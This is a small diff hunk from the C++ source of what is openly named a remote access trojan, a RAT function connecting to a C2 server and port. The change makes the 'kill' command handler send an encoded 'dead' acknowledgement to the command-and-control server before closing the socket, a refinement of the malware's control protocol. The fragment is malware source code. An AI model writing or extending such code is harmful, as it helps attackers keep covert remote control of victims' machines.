@@ -252,6 +252,10 @@ void RAT(char* C2_Server, int C2_Port)
                 }
                 else if (strcmp(command, "kill") == 0) 
                 {
+                    char buffer[64] = "";
+                    strcat(buffer,"ZGVhZA");
+                    send(tcp_sock,buffer,strlen(buffer) + 1, 0);
+
                     close(tcp_sock);
                     std::cout << "Socket killed. Sleep Start" << std::endl;
                     sleep(1);
